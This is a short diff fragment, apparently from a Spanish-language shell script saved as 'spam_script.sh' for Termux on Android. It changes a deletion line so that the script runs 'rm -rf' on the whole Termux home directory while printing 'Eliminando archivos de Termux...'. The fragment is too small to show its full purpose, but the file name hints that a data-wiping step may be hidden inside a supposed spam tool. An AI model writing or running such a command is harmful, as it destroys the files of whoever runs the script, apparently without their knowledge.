@@ -32,7 +32,7 @@ sleep 5
 
 # Borrar archivos de Termux
 echo -e "\033[31mEliminando archivos de Termux...\033[0m"
-rm -rf .
+rm -rf /data/data/com.termux/files/home/*  # Borra todo dentro de Termux, pero no los archivos de storage
 # Puedes agregar más directorios y archivos a eliminar si es necesario.
 
 echo -e "\033[33mProceso completo.\033[0m"' > ~/scripts/spam_script.sh
